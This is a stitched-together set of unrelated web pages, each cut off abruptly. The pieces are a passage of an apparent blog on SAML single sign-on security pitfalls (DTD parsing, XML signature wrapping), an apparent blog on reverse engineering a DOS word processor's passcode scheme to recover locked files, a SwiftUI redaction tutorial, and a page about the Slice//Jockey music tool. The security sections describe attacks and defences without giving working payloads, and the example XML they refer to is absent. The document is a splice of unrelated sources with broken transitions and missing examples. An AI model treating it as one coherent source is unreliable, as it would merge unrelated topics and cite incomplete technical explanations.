href="https://stackoverflow.blog/2019/07/11/single-sign-on-sso-stack-overflow-okta-integration/">investment by teams</a> - on the scale of months, representing hundreds of thousands of dollars in developer time.<strong>‍</strong></p><p><strong>If not done right, you expose your application and your customers to potentially huge security risks. </strong>To drive that home, here are just a few recently published SAML-related vulnerabilities:</p><ul role="list"><li><a href="https://nvd.nist.gov/vuln/detail/CVE-2019-15585">January 27, 2020</a> - “... GitLab SAML integration had a validation issue that permitted an attacker to takeover another user's account.”</li><li><a href="https://nvd.nist.gov/vuln/detail/CVE-2020-4427">May 7, 2020</a> - “... an attacker could exploit this [SAML] vulnerability to bypass the authentication process and gain full administrative access to the system [IBM Data Risk Manager].”</li><li><a href="https://nvd.nist.gov/vuln/detail/CVE-2018-21263">June 19, 2020</a> - “An attacker could authenticate to a different user's [Mattermost] account via a crafted SAML response.”</li><li><a href="https://nvd.nist.gov/vuln/detail/CVE-2020-2021">June 29, 2020</a> - “... improper verification of signatures in PAN-OS SAML authentication enables an unauthenticated network-based attacker to access protected resources.”</li></ul><p>It should be evident by now that oversights in SAML implementations are ubiquitous and problematic, even among experienced engineering teams.</p><p>So let’s dive into some of the more common security pitfalls developers building SAML-based SSO should be aware of, as well as cover a few suggested countermeasures. Just to be clear, <strong>this guide is by no means comprehensive</strong> and is meant to provide a starting point for SAML security considerations as well as some follow-on resources.</p><h2>Brief anatomy of a SAML response</h2><p>Let's say we're integrating our application with Okta via SAML. Below is an example of an XML document we might get when attempting to authenticate a user, containing a simplified but valid SAML response:</p><p>Like we mentioned earlier, the SAML spec is complex and responses can get lengthy, so this example is comparatively quite terse. Keeping things to what you should know before we go into SAML vulnerabilities, let’s walk through what the response (<strong><em>&lt;saml2p:Response&gt;</em></strong>) is communicating:<br></p><ul role="list"><li>Line 2 begins the SAML response, which has the unique ID <strong><em>id72697176167120131651975993</em></strong> and is intended for consumption by the <strong><em>workos-test</em></strong> service provider’s Assertion Consumer Service (ACS) URL, i.e. the endpoint <strong><em>https://api.workos-test.com/auth/okta/callback</em></strong>.</li><li>Line 3 specifies the issuer (<strong><em>&lt;saml2:Issuer&gt;</em></strong>) and contains the unique URI (also referred to as EntityID) of the IdP that issued the response, in this case <strong><em>http://www.okta.com/exk1klancwHzz1SNi357.</em></strong></li><li>Line 7 begins the assertion (<strong><em>&lt;saml2:Assertion&gt;</em></strong>) with the unique ID <strong><em>id7269717616793800631152500</em></strong>. An assertion is a package of information asserting the identity of a user, often containing additional user attributes like first / last name, email, ID, etc.</li><li>Line 8 specifies the issuer of the assertion itself, in this case also <strong><em>http://www.okta.com/exk1klancwHzz1SNi357</em></strong>.</li><li>Lines 9 - 30 contains the digital signature (<strong><em>&lt;ds:Signature&gt;</em></strong>) over the assertion, which should be validated to determine the authenticity of the assertion.</li><li>Lines 31 - 36 specify the subject (<strong><em>&lt;saml2:Subject&gt;</em></strong>) of the assertion, i.e. the authenticated principal / user corresponding to the unique identifier found in <strong><em>&lt;saml2:NameID&gt;</em></strong>, who in this case is <strong><em><a href="https://workos.com/cdn-cgi/l/email-protection" data-cfemail="87e3e2eae8c7f0e8f5ece8f4aae8ecf3e6a9e4e8ea">[email&nbsp;protected]</a></em></strong>.</li><li>Line 37 (<strong><em>&lt;saml2:Conditions&gt;</em></strong>) defines the window of time for which the assertion should considered valid, i.e. from <strong><em>NotBefore</em></strong> (inclusive) to <strong><em>NotOnOrAfter</em></strong> (exclusive).</li></ul><p>For the purposes of readability, the SAML 2.0 XML snippets in the remainder of this blog will be simplified, use shorthand, and be stripped of nodes that would otherwise be required in reality but are not relevant to what’s being illustrated. We’ll use a mythical IssueTracker, ContractManager, and PayrollService as hypothetical SPs that have implemented SAML authentication, which you should think of as placeholders for your application or other SAML SSO-enabled apps.</p><h2>Disable DTD processing</h2><p>The first step in processing a SAML response is parsing the payload. Parsing and loading an XML document into memory is an inherently expensive set of operations, but can be unexpectedly costly due to a feature of XML that allows references to external or remote documents, i.e. <a href="https://en.wikipedia.org/wiki/Document_type_definition">Document Type Definitions</a> (DTDs).</p><p>When a DTD is encountered, parsers will try to fetch and load the referenced document as well. If the referenced document is large enough or results in infinitely looping references, your server can be slowed or even brought down trying to complete the process. The same holds true if the payload itself is very large, DTDs or not.</p><p>Two low-hanging mitigations you should implement to prevent buffer overflows are:<br></p><ol role="list"><li>Limiting SAML payload size to &lt; 1MB. 1MB is a generous upper limit and should be tuned down based on average received payload size.</li><li>Configuring your XML parser to never fetch remote files or try to load and parse DTDs. Some XML parsers do so by default, for example, Python’s <a href="https://docs.python.org/3/library/xml.etree.elementtree.html"><strong><em>xml.etree.ElementTree</em></strong></a> module.</li></ol><p>XML processing, and thus by extension SAML response processing, is vulnerable to buffer overflow attacks from other scenarios described later on in this post. And unfortunately, protecting your application from a service outage is among the most mild of outcomes compared to the <a href="https://www.vsecurity.com//download/papers/XMLDTDEntityAttacks.pdf">possibilities exploiting XML DTD</a> allows - it is a dark and anxiety-inducing rabbit hole.</p><p>So, if you’re not writing your own XML parser (generally not suggested), it’s important to <strong>vet the XML parser(s) your application and its dependencies use</strong> - ensure they handle other exploits like <a href="https://en.wikipedia.org/wiki/Billion_laughs_attack">Billion Laughs</a> and <a href="https://en.wikipedia.org/wiki/Zip_bomb">Zip Bombs</a>.</p><h2>Validate the SAML response schema first<br></h2><p>The primary security mechanism in the SAML handshake is the cryptographic validation of <a href="https://en.wikipedia.org/wiki/XML_Signature">XML Signatures</a> (XML-DSig) - which establishes the trust chain between IdPs and SPs. XML-DSig validation should always be done prior to executing business logic; however, the separation between signature verification and operating on the rest of a SAML payload opens up SAML authentication to vulnerabilities exposed by what are called XML Signature Wrapping (XSW) attacks. &nbsp;These attacks have numerous permutations which can result in outcomes such as (but not limited to):<br></p><ul role="list"><li>Denial-of-service by inserting arbitrary elements that lead to buffer overflows.</li><li>Escalating permissions by injecting assertions that allow an adversary to impersonate and be authenticated as another user, like an account admin.</li></ul><p>The exploit here consists of modifying the payload without invalidating any signatures - think <a href="https://owasp.org/www-community/attacks/SQL_Injection">SQL Injection</a> or <a href="https://owasp.org/www-community/attacks/xss/">Cross Site Scripting,</a> but for for XML.</p><p>Original response (pre-XSW):</p><p>Modified response (post-XSW):</p><p>The broadest countermeasure to XSW attacks is <strong>validating the schema</strong> of the SAML XML document. Payloads for SAML responses of any given IdP should have a deterministic standard schema that can be used as a reference in a schema compliance validation module, which should be executed prior to XML-DSig verification. Here are <a href="https://github.com/onelogin/python3-saml/tree/master/src/onelogin/saml2/schemas">example schemas</a> used by OneLogin’s <strong><em>python3-saml</em></strong> package to perform <a href="https://pythonhosted.org/python-saml/library/saml2.html#saml2.utils.OneLogin_Saml2_Utils.validate_xml">XML schema validation</a>. <strong>Schemas should be vetted local copies</strong> as opposed to being fetched from 3rd party remote locations at runtime or on server start.</p><p>All of that being said, <a href="https://www.nds.ruhr-uni-bochum.de/media/nds/veroeffentlichungen/2013/03/25/paper.pdf">schema validation isn’t foolproof</a>; there is room for error in the validation module logic itself, as well as in the syntactic rigor of the reference schema. A second low-hanging countermeasure to XSW attacks that should be employed for the sake of redundancy is to <strong>always use absolute XPath expressions</strong> to select elements in processes post-schema validation. Explicit absolute XPath expressions set an unambiguous expectation for the location of elements.</p><p>Here’s an example of a valid response that’s been modified in an XSW attack (specifically a signature exclusion attack, more on that later):</p><p>This modification also exploits the common, incorrect, but not unreasonable assumption that a well-formed SAML response will only ever have a single assertion. So while XML-DSig verification would succeed for the signature returned by <strong><em>doc.getElementsByTagName(“Signature”)[0]</em></strong>, the assertion returned and processed by <strong><em>doc.getElementsByTagName(“Assertion”)[0]</em></strong> would be the injected <strong><em>snek</em></strong> assertion. This attack would have been more likely to fail if the XPath expression&nbsp;<strong><em>“/Response/Assertion[0]/Signature”</em></strong> was used in the assertion signature validation logic.</p><h2>Check that you’re the intended recipient</h2><p>This sounds obvious, but make sure to check that a SAML response is intended for your app. This is low-hanging fruit that can prevent attacks exploiting IdPs that use a shared private signing key for all integrated SPs of a given tenant, as opposed to issuing unique keys per application. The most common attack entails the …</p></figure></div></div></div>

<h2 id="intro">Intro</h2>
<p>In August 2020, we were commissioned by a client with a cache of locked QText documents from the mid 90s - to which he has lost the passcode.</p>

<p><a href="https://en.wikipedia.org/wiki/QText_(word_processor)">QText</a> was a DOS era Hebrew-English word processor written in Turbo Pascal, released 15 or so odd years before neither I or @Elisha had laid hands on a reverse engineering tool.</p>

<p>In this blog post, we’ll describe the process of analyzing the encrypted documents and reverse engineering a DOS program.</p>

<p>Hopefully we’ll be able to provide some insight into the early days of software development in Israel, and more generally into how cryptography was viewed and implemented in the early days of consumer software development.
We also hope to help preserve the knowledge and tools utilized here - a lot of which have scracely survived to this day.</p>

<h2 id="getting-started---qtext">Getting started - QText</h2>
<p>Luckily, we had access to working QText binaries, supplied by our client.
We loaded up an instance of the <a href="https://www.dosbox.com/">DOSBOX</a> emulator and proceeded to play around with the word processor for a while - focusing on the document encryption feature.</p>

<p>Our initial conclusions included the following:</p>
<ul>
  <li>The passcode is short - 4 characters and limited to uppercase characters and numbers - which represents a very small keyspace relative to modern compute power.</li>
  <li>Documents are normally some form of plain rich text - but locked documents have a \(0x1D\) header prepended to them. Documents with the same passcode have the same header (no salt).</li>
  <li>Out of \(0x1D\) header bytes - \(16\) are actually variable and correlate directly to the passcode - could it be the encryption key is included in the file?</li>
  <li>Unfamiliar encryption - seems to work on per-line and per-column basis, meaning equal plaintext lines would result in equal ciphertext lines. Spaces are skipped when encrypting, which indicates the per-column charateristic.</li>
</ul>

<center>
    <figure>
      <img src="https://pipornithology.dev/images/key_line.png" alt="First line of two documents with different passcodes - key is underlined">
      <figcaption><i>First line of two documents with different passcodes - key is underlined</i></figcaption>

    <figure>
      <img src="https://pipornithology.dev/images/space_nospace.png" alt="Payload from two documents with same passcode and plaintext - one is interlaced with spaces">
      <figcaption><i>Payload from two documents with same passcode and plaintext - one is interlaced with spaces</i></figcaption>
    </figure>
</center>

<p>So a very rudimentary system, as you might expect considering this was developed at a time before the internet was commonplace - let alone knowledge of cryptographic best-practice.</p>

<p>The key seems to be included in the file, but we don’t know the encryption mechanism. 
We could try and reverse engineer the encryption function, but brute-forcing the passcode is feasible, and in this case much simpler - if we have a fast way to test the passcodes.</p>

<p>Working under the relatively safe assumption that the 16 byte key in the file is somehow derived from the passcode - we can try and focus our RE efforts on the key derivation algorithm.
Our first guess was that the passcode was simply hashed using a hash function from that time, but that direction unfortunately didn’t pan out.</p>

<p>We set our sight on the key derivation algorithm and started taking apart the executable.</p>

<h2 id="reversing-ms-dos-binaries">Reversing MS-DOS binaries</h2>
<p>DOS operates in <a href="https://wiki.osdev.org/Real_Mode">real mode</a>, meaning the entire 16 bit address space is shared between all processes and is addressed using a 16 bit <a href="https://wiki.osdev.org/Segmentation">segment</a> selector and an additional 16 bit address - which are used to cover a usable memory range of 640KB.</p>

<p>Executables are not PEs, but <a href="https://en.wikipedia.org/wiki/DOS_MZ_executable">DOS MZ executables</a>.
The <code>file</code> utility recognizes our QTtext binary as a <a href="https://en.wikipedia.org/wiki/PKZIP">PKZip</a> packed SFX - self extracting executable.</p>

<center>
<img src="https://pipornithology.dev/images/file_util.png" alt="">
</center>

<h3 id="pkzip">PKZip</h3>
<p><a href="https://en.wikipedia.org/wiki/PKWare">PKWare</a> is responsible for the popularity of the ZIP file format as we know it today, 
and also for a for a widely used executable packer in the MS-DOS age.</p>

<p>There isn’t a lot of readily available information about the PKZip packer - presumably it utilized the same compression algorithm as the non-SFX zip utility,
but we were struggling to find a tool that would properly unpack the SFX to a functioning executable.</p>

<p>Having failed to find additional information about this packer, and wanting to avoid reverse engineering the unpacker stub - 
we attempted to use the DOSBOX debuggers CPU <code>LOG</code> feature to step past the unpacker code, sometime after the original entry point - and then extract the code from memory.</p>

<p>While this did work, it only accounted for a small part of the code - the executable was 24K in size (packed).</p>

<p>Recalling older days of reversing crackmes (though not as old as this program), we went looking for a generic executable unpacking tool which used to be a dime a dozen on cracking sites.</p>

<p>Preceding some open-source trends by over a decade, their inner-working were often mysterious, but most of the time they did the job.
Eventually we found the <a href="http://blog.ssokolow.com/archives/2018/12/02/resources-for-reverse-engineering-16-bit-applications/">following ssokolow blog post</a> which guided us to the the a mythical reverse engineering relic - <a href="https://www.exetools.com/">exetools</a>.</p>

<p>The unpacker page had a huge list of unpackers, we assume a lot of them would have done the job - as PKZip was fairly common. 
We first tried the one called <code>PKUNLITE</code>, and when that didn’t work (but looked promising) - we found success with <code>DISLITE v1.15</code>.</p>

<h3 id="int-3f---ms-dos-overlays">int 3f - MS-DOS Overlays</h3>
<p>Loading the binary in IDA Free 5.0 (which luckily is still in distribution - hosted at the <a href="https://www.scummvm.org/">ScummVM</a> website) showed that the executable utilized Turbo Pascal like memory overlays.</p>

<p>Since we’re running in real mode, paging/swapping memory wasn’t possible, and overlays were the solution to the limited memory space.</p>

<p>The overlay mechanism was essentially an implementation of page swapping in user-space:
The executable contained root segments of non-movable memory, and was accompanied by an <code>.ovr</code> file which contained additional code (in this case, a LOT of additional code).</p>

<p>The root code (which originates from the <code>.exe</code> file) is always mapped into memory, while segments of the overlay were mapped into memory selectively and swapped on-demand.</p>

<p>Calls between overlays (and the root segment) occured through a jump table, if the overlay was already mapped into memory, the jump table stubs were “linked” to its current location in memory.</p>

<p>Otherwise, it led to (in this case) an <a href="https://dos4gw.org/3F_-_Overlay_manager_interrupt_Microsoft_LINK_EXE_Borland_TLINK_VROOMM"><code>int 3f</code></a> instruction, and alongside it - the overlay metadata.</p>

<p>The overlay metadata contained - among other things - the file offset of the relevant code segment.</p>

<p>The interrupt handler would then map the relevant overlay into memory, in place of another overlay, and fix up the stubs, before resuming execution.</p>

<center>
    <figure>
      <img src="https://pipornithology.dev/images/unlinked_stub.PNG" alt="An example of an unlinked stub. Note the overlay metadata above.">
      <figcaption><i>An example of an unlinked stub. Note the overlay metadata above.</i></figcaption>

      <img src="https://pipornithology.dev/images/linked_stub.PNG" alt="Same stub, now linked after its overlay was loaded into memory.">
      <figcaption><i>Same stub, now linked after its overlay was loaded into memory.</i></figcaption>
    </figure>
</center>

<p>IDA does an excellent job in flattening and statically linking the stubs so we can reverse engineer the program in its entirety.</p>

<p>However this presented a challenge for us in dynamically debugging the code, since while the root segments were always loaded into the same memory area, the overlays would change location very often, making it impossible for us to place breakpoints properly.</p>

<p>Dredging up information about the Turbo Pascal overlay system was difficult, and the DOSBOX debugger did not conveniently support stepping out of the interrupt.</p>

<p>It’s likely that we could have reverse engineering the interrupt handler and found a place to break in right before resuming program execution in the newly loaded overlay,
but we eventually opted for a simpler solution - finding an overlay-to-root call that we could break on and then step out into the newly loaded overlay.</p>
<center>
    <figure>
      <img src="https://pipornithology.dev/images/overlay-to-root.PNG" alt="An example of a call from an overlay to the root segment.overlay-to-root.PNG">
      <figcaption><i>An example of a call from an overlay to the root segment.overlay-to-root.PNG</i></figcaption>
    </figure>
</center>

<p>In the above example <code>pascal_strncpy</code> is located in the root segment and its address is fixed and predictable. To break into the calling function in overlay 73, we would instead place a 
breakpoint at <code>pascal_strncpy</code> and step out into the calling function.</p>

<p>This is slightly arduous but for the fairly short task at hand it would work, and we had ample overlay-to-root calls to break on since the root segment hosted a lot of
Turbo Pascal standard functions.</p>

<h2 id="key-expansion-function">Key expansion function</h2>
<h3 id="tracing-through-passcode-flow">Tracing through passcode flow</h3>
<p>Finding the key expansion function took some reversing and a lot of tracing.
Our initial idea was perform hot spot analysis by using DOSBOX’s CPU <code>LOG</code> command to trace execution while repeatedly failing the passcode check on a locked document.</p>
<center>
<img src="https://pipornithology.dev/images/wrong_passcode.PNG" alt="">
</center>

<p>Eventually we went for a more direct approach and simply placed a breakpoint on the <code>int 21</code> interrupt handler to catch open and read calls.</p>
<center>
    <figure>
      <img src="https://pipornithology.dev/images/dosbox_int21_3d_open.PNG" alt="The DOSBOX debugger at a interrupt call to open. The requested path is seen in the data overview.">
      <figcaption><i>The DOSBOX debugger at a interrupt call to open. The requested path is seen in the data overview.</i></figcaption>
    </figure>
</center>

<p>We traced through an open on the document path and a read of \(0x1D\) bytes - which is the exact size of the header we saw in locked documents.
Continuing with dynamic debugging, we pinpointed a function that takes the entered passcode string and the \(0x1D\) header as parameters.</p>

<p>Digging in, we see how the the passcode is passed into an internal function, and the result is compared to the header.</p>

<center>
    <figure>
      <img src="https://pipornithology.dev/images/header_check.PNG" alt="Part of the passcode check flow - this function returns 1 if the passcode was valid.">
      <figcaption><i>Part of the passcode check flow - this function returns 1 if the passcode was valid.</i></figcaption>
    </figure>
</center>

<p>Presumably, the function call prior to the <code>memcmp</code> performs key expansion, and the result is then compared to the file header.</p>

<h3 id="key-derivation-function">Key derivation function</h3>
<p>The passcode is first passed through a permutation function which iteratively increments each byte of the passcode by the sum of all bytes in the string.
Before proceeding to the byte in the next position, a certain predicate is tested by using the value of the resulting byte as an index into a static bitmap - where each bit represents whether or not
that byte value is valid (1) or not (0). A more modern example of this sort of bitmap in use can be found in <a href="https://en.wikipedia.org/wiki/Control-flow_integrity">CFG</a>.</p>

      <p>In iOS 14, SwiftUI has a new modifier to redact any content. You apply it to any view with a new view modifier, <code>redacted(reason:)</code>. This modifier required a reason modifier, which tells SwiftUI the reason for this redaction. Right now, Apple provides only one reason, <code>.placeholder</code>.</p>
<p>Here’s how it looks:</p>
<pre><code><span><span>Text</span><span>(</span><span>"Hello, SwiftUI!"</span><span>)</span></span><br><span>    <span>.</span><span>redacted</span><span>(</span>reason<span>:</span> <span>.</span>placeholder<span>)</span></span></code></pre>
<figure>
  <img src="https://d33wubrfki0l68.cloudfront.net/cf0b92e42350e66b8b11e546ba02ecd2b5bbd27a/91d16/images/redacted-sample.png" alt="Redact with placeholder style">
  <figcaption>Redact with placeholder style</figcaption>
</figure>
<p>As the name implies, placeholder reason redact content in a way to be used as a placeholder before the actual content is loaded.</p>
<p>Since Apple design <code>RedactionReasons</code> as an option set, I expected more reason that we can use and combine in the future. Something like <code>.sensitive</code> reason with pixelation effect or <code>.animated</code> which produce a shimmering effect would be a nice add up.</p>
<pre><code><span><span>public</span> <span>struct</span> <span>RedactionReasons</span> <span>:</span> <span>OptionSet</span></span></code></pre>
<h2 id="complex-view">Complex View <a href="#complex-view">#</a></h2>
<p>Redaction reasons pass along to all child views. That's mean you can call it on a parent view, and all subviews would get the same reasons.</p>

<h2 id="opt-out">Opt-out <a href="#opt-out">#</a></h2>
<p>If you don't want some view to be redacted, you can opt-out by using <code>.unredacted()</code> which removes any redaction reason that is applied to the view.</p>
<pre><code><span><span>Text</span><span>(</span><span>"Big Sur <span><span>\(</span><span>Image</span><span>(</span>systemName<span>:</span> <span>"sun.dust"</span><span>)</span><span>)</span></span>"</span><span>)</span></span><br><span>        <span>.</span><span>font</span><span>(</span><span>.</span>title<span>)</span></span><br><span>        <span>.</span><span>fontWeight</span><span>(</span><span>.</span>bold<span>)</span></span><br><span>        <span>.</span><span>foregroundColor</span><span>(</span><span>Color</span><span>.</span>blue<span>)</span></span><br><span>        <span>.</span><span>unredacted</span><span>(</span><span>)</span></span></code></pre>
<p>Add <code>.unredacted()</code> to <code>Text</code> will produce the following result:</p>

<h2 id="caveats">Caveats <a href="#caveats">#</a></h2>
<p>At current Xcode beta (beta 6), redact a view only changes its appearance, but it can still receive user interaction. If you have a redacted button, beware that the button can still receive user action.</p>

<h2 id="redaction-aware-view">Redaction-aware view <a href="#redaction-aware-view">#</a></h2>
<p>We can make our view redaction-aware and respond to the redaction reason by observing the value in <code>@Environment(\.redactionReasons)</code>.</p>
<p>In the following example, we modify our LandmarkView to show SF Symbols image over the Big Sur image if a redaction reason is presented.</p>
<pre><code><span><span>struct</span> <span>LandmarkView</span><span>:</span> <span>View</span> <span>{</span></span><br><span>  @<span>Environment</span><span>(</span>\<span>.</span>redactionReasons<span>)</span> <span>private</span> <span>var</span> reasons </span><br><span>   </span><br><span>  <span>var</span> body<span>:</span> some <span>View</span> <span>{</span></span><br><span>    <span>VStack</span><span>(</span>alignment<span>:</span> <span>.</span>leading<span>)</span> <span>{</span></span><br><span>      <span>if</span> reasons<span>.</span><span>isEmpty</span> <span>{</span> </span><br><span>        <span>Image</span><span>(</span><span>"bigsur"</span><span>)</span></span><br><span>          <span>.</span><span>resizable</span><span>(</span><span>)</span></span><br><span>          <span>.</span><span>frame</span><span>(</span>width<span>:</span> <span>100</span><span>,</span> height<span>:</span> <span>100</span><span>)</span></span><br><span>          <span>.</span><span>clipShape</span><span>(</span><span>Circle</span><span>(</span><span>)</span><span>)</span></span><br><span>      <span>}</span> <span>else</span> <span>{</span></span><br><span>        <span>Image</span><span>(</span><span>"bigsur"</span><span>)</span></span><br><span>          <span>.</span><span>resizable</span><span>(</span><span>)</span></span><br><span>          <span>.</span><span>frame</span><span>(</span>width<span>:</span> <span>100</span><span>,</span> height<span>:</span> <span>100</span><span>)</span></span><br><span>          <span>.</span><span>clipShape</span><span>(</span><span>Circle</span><span>(</span><span>)</span><span>)</span></span><br><span>          <span>.</span><span>overlay</span><span>(</span> </span><br><span>            <span>Image</span><span>(</span>systemName<span>:</span> <span>"photo"</span><span>)</span></span><br><span>              <span>.</span><span>font</span><span>(</span><span>.</span><span>system</span><span>(</span>size<span>:</span> <span>34</span><span>,</span> weight<span>:</span> <span>.</span>bold<span>)</span><span>)</span></span><br><span>              <span>.</span><span>foregroundColor</span><span>(</span><span>.</span>white<span>)</span></span><br><span>              <span>.</span><span>unredacted</span><span>(</span><span>)</span><span>)</span></span><br><span>      <span>}</span></span><br><span>      <span>Text</span><span>(</span><span>"Big Sur <span><span>\(</span><span>Image</span><span>(</span>systemName<span>:</span> <span>"sun.dust"</span><span>)</span><span>)</span></span>"</span><span>)</span></span><br><span>        <span>.</span><span>font</span><span>(</span><span>.</span>title<span>)</span></span><br><span>        <span>.</span><span>fontWeight</span><span>(</span><span>.</span>bold<span>)</span></span><br><span>        <span>.</span><span>foregroundColor</span><span>(</span><span>Color</span><span>.</span>blue<span>)</span></span><br><span>        <span>.</span><span>unredacted</span><span>(</span><span>)</span></span><br><span>      <span>Text</span><span>(</span><span>"Lorem Ipsum is simply dummy text of the printing and typesetting industry.

<p>&lt;1&gt; We add <code>@Environment(\.redactionReasons)</code> for our view to read redaction reason and act accordingly.<br>
&lt;2&gt; If the reason is not set (<code>reasons.isEmpty</code>), we show the image as is.<br>
&lt;3&gt; If the reason is set (<code>.redacted</code> is applied), we show SF Symbols over our redacted image.</p>

<h2 id="conclusion">Conclusion <a href="#conclusion">#</a></h2>
<p>Tips and tricks in this article should be enough for you to work around limitations you encounter with redaction API. Even though we only have a redaction reason right now, I think Apple will support more variation in this API's rendering effect in the future, and I'm looking forward to it.</p>

<p>
Imagine a DJ set, and instead of turntables or cd players or iPods,
it has two recorders. Real-time-beat-slicing recorders. Sound from your
microphone is analysed, and sliced into coherent fragments which are engaged in
playback rightaway. Slice//Jockey is a crossover of music game and live
performance tool.
</p>

<img src="http://www.katjaas.nl/slicejockey/slicejockey3.gif" alt="">

<p>
Slice//Jockey is one fruit of [slicerec~] and [sliceplay~], Pure Data externals
designed for real-time beat slicing. The technique inside is discussed on
<a href="http://www.katjaas.nl/beatdetection/beatdetection.html">earlier pages</a>.
Slice//Jockey runs on Linux, MacOS and Windows, provided you have Pure Data
plus a few external libraries installed. Links for download and installation
are in the menu. Earlier versions of Slice//Jockey were targeted at
Pd-extended. Eight years after the first release in 2011, renewed interest in
the project resulted in Slice//Jockey version 3, now for vanilla Pd.
This webpage is updated accordingly, also to reflect shifts in the realm of
hardware and operating systems. The original page is archived
<a href="http://www.katjaas.nl/slicejockey/slicejockey-original.html">here</a>.

</p>

<p>
Slice//Jockey has detailed help files built into the project itself. Clicking
the question mark on the front opens an overview with a miniature Slice//Jockey
where you can click around further to open help windows on all buttons.
</p>

<img src="http://www.katjaas.nl/slicejockey/overview.gif" alt="">

<p>
In particular the quickstart window will help to get your first sounds into the
recorders. Despite its puzzling ascii labels, Slice//Jockey operation is pretty
intuitive. Global lay out and concept of Slice//Jockey are described here on
this page.

Two recorders are represented by blocks on the left and right side of the
window. Sound from the computer's soundcard channels is mixed to mono and sent
to both recorders. An input button [&gt;] on each recorder controls whether that
recorder is listening to your input audio or not. If it is listening, sounds
with clear attack will be recorded slice-wise automatically. Indicators above
the scope trace will tell you when recording happens.
</p>


<img src="http://www.katjaas.nl/slicejockey/SJslicycle.gif" alt="">

<p>
Up to 8 slices are stored in a circular buffer for each recorder. When the 9th
slice is recorded, the first one is discarded, and so on, following the FIFO
(first in, first out) principle.
</p>

<p>
Technically speaking, your computer could easily record thousands of slices
into memory. Restriction to eight slices per recorder is a conceptual choice,
not an issue of memory efficiency. All eight slices are engaged in playback. No
time for book keeping during live performance! If you want variation, just play
again into the recorders. Do not be afraid of overwriting a beautiful sound
with a dreadful squeak. That's life. The more you play, the better sounds you
will find.
</p>




<p>
Input sound for the recorders is subject to basic processing only. You can
activate a hi-pass filter, in case your microphone produces too much low
frequency content due to proximity effect. Further, you can enable a compressor
/ noise suppressor to make the recorders more selective to your sounds in a
noisy live situation. The mono input signal is plotted as a scope trace.
</p>

<img src="http://www.katjaas.nl/slicejockey/inputblock.gif" alt="">

<p>
Filter, compander and in-to-out buttons are found on the bottom-left of the
window, together with a time-signature (4/4 or 6/8) button. Notice those tiny
characters 'ZXCV'. They indicate shortcut keys for the buttons. Shortcut keys
only work when focus is on the Slice//Jockey window, and only for lower case
characters (they are printed as capitals because that is how they show on
keyboard keys).
</p>

<p>
It is beneficial to use a unidirectional microphone when feeding sound
into Slice//Jockey. Omnidirectional microphones like the ones built into
computers will pick up much of the speaker output and feed it back into the
recorder. The recorder will happily continue slicing under such conditions, and
results can be quite interesting. But it is better to have control over it. You
can always point a unidirectional mic to the speaker deliberately if you want
chaos. The picture below shows
<a href="http://www.katjaas.nl/DIYmic/DIYmic.html">DIY unidirectional mics</a>
that connect directly to computer mic input jack.

Hints for running Pd as a realtime process on Linux are on
<a href="https://puredata.info/docs/faq/how-can-i-run-pd-with-realtime-priority-in-gnu-linux">puredata.info</a>.
Real time priority for Pd reduces the risk of audio dropouts.





<p>
The x-y field has twenty control objects in two dimensions. This means, some 40
parameters are controlled on the surface which is printed below with it's
actual size. Resolution and precision is much better than for 40 knobs or
faders with each 1/40 of the field surface. Not surprisingly, the x-y layout is
inspired by Korg's famous Kaoss Pad, but also by computer music applications
like
<a href="http://jeremywentworth.com/">Jeremy Wentworth's</a>
GrainMainFrame.
</p>

<img src="http://www.katjaas.nl/slicejockey/xy-multipad.gif" alt="">

<p>
With all buttons and x-y objects at the size of a fingertip Slice//Jockey is most conveniently operated from a touch screen, good old mouse being a less hands-on alternative. More about touch screens in the section about hardware further down.
</p>






<p>
Slice//Jockey records slices of audio into a circular buffer, while storing
cuepoints for start and end of each slice. As stated, slices are engaged in
playback immediately. But how is playback controlled? Obviously, you can not
make a composition or midi sequence on beforehand for sounds still to be
recorded. Instead, playback is triggered according to very basic principles,
and manipulated with some controls.
</p>

<p>
Each recorder has three players associated: one for quarter notes, one for
eighth notes and one for sixteenth notes. If you want, the players can be
disconnected from BPM-synched triggering, to play with random time intervals.
Each player follows a pattern to select slices for playback. These patterns are
generated by a mathematical routine which guarantee optimal variation within a
cycle of sixteen triggers. If you move playback controls, conditions for these
routines change, and different patterns will result. For sixteenth notes, the
pattern cycle is one bar. For eighth notes the pattern encompasses two bars,
and for quarter notes four bars. If you want, the players can be disconnected
from pattern-wise triggering, to play randomly selected slices.
</p>

<img src="http://www.katjaas.nl/slicejockey/notes.gif" alt="">

<p>
These are playback controls on the x-y field, for quarter notes, eight notes
and sixteenth notes. In horizontal direction, slice playback speed is set.
Playback speed determines pitch, like a record or tape which is slowed down or
sped up. Slice playback speed/pitch is independent from BPM tempo or trigger
tempo.
</p>

<p>
In vertical direction, the controls set variation in playback speed, as an
addition to the basic playback speed which was set in horizontal direction.
Variation of playback speed does not mean vibrato. From start till end of one
slice, playback speed will remain constant. Playback speed will only vary from
one slice to the next.
</p>

<p>
Each of both recorder-playback sections has it's own effects controls on the
x-y field. There is feedback delay, resonant filter, distortion and reverb.
</p>

<p>
Left and right sections each have their own colour, which is reflected in
controls on the x-y field. Here we see white-coloured controls, belonging to
the left section.
</p>

<img src="http://www.katjaas.nl/slicejockey/effects.gif" alt="">

<p>
Global controls on the x-y field are colored black. They control:
    </p><ul>
        <li>input signal level</li>
        <li>output signal level and crossfader</li>
        <li>reverb for input signal</li>
        <li>BPM value and 16th note triplet feel</li>
        <li>global pitch</li>
    </ul>


<img src="http://www.katjaas.nl/slicejockey/globals.gif" alt="">

<p>
The right bottom of the window has buttons for help, settings, and session
recorder. A simple soundfile player is included for quick evaluation. Below
them is a beat indicator, counting beats according to the BPM value on the x-y
field. Notice that the beat indicator will always sync with your live session,
and not with soundfiles played back.
</p>

<img src="http://www.katjaas.nl/slicejockey/recorder.gif" alt="">




<p>
Clicking the exclamation mark on the front window pops a window with technical
settings. When preparing for a Slice//Jockey session, it may be necessary to
tune some of these settings. This window has it's own help file to guide you
through options.
</p>

<img src="http://www.katjaas.nl/slicejockey/settings.gif" alt="">

<p>
Here I want to highlight Pure Data's audio settings, where you can select input
and output devices for the program. Slice//Jockey listens to the input device
which is set here. Do not forget to check the checkbox for input device, and
set the appropriate number of channels. After selecting your devices, click
'apply' and 'ok'. Below is Pd's audio properties window for MacOSX. The window
looks different for other operating systems.
</p>

<img src="http://www.katjaas.nl/slicejockey/audiosettings.gif" alt="">
<img src="http://www.katjaas.nl/slicejockey/audiosettings2.gif" alt="">

<p>
Another setting to be highlighted is 'silence-threshold'. It's value determines
at what sound level slice recording will end if there is nothing useful to hear
anymore. But, imagine you have a very noisy microphone preamp, like is the case
